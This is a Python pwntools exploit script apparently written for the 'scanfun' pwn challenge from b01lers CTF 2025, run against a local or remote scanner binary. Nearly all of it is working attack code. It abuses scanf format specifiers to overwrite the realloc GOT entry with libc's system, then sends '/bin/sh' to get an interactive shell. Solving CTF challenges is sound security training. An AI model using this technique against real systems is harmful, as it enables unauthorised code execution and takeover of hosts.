#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./scanner_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x121B
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

# https://github.com/b01lers/b01lers-ctf-2025-public/blob/main/src/pwn/scanfun/solve/writeup.md
ru(b'no more [')
leak  = int(ru(b']', drop=True), 16)

print(hex(libc.symbols["_IO_2_1_stdout_"]))

sl(b'%16$ms')
sl(b'A' * 0x40000)

high_guess = 0
def get_address(addr, size=4, is_bytes=True):
    hb_addr = (addr >> 16) & 0xFF
    hb_stdout = (libc.symbols["_IO_2_1_stdout_"] >> 16) & 0xFF
    real_addr = (((addr + high_guess) & 0xFFFF) | ((leak - hb_stdout + hb_addr) << 16)) & 0xFFFFFF
    if is_bytes:
        return real_addr.to_bytes(size, byteorder='little')
    else:
        return hex(real_addr)

# one_gadget = 0xebd43
system = libc.symbols["system"]
print(get_address(system))

sl(b'%16$3c')
sl(get_address(libc.got["realloc"], size=3))

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

sl(b'%18$3c')
sl(get_address(system, size=3))

sl(b'%23$ms')
sl(b'/bin/sh;' + b'a'*0x100)


interactive()
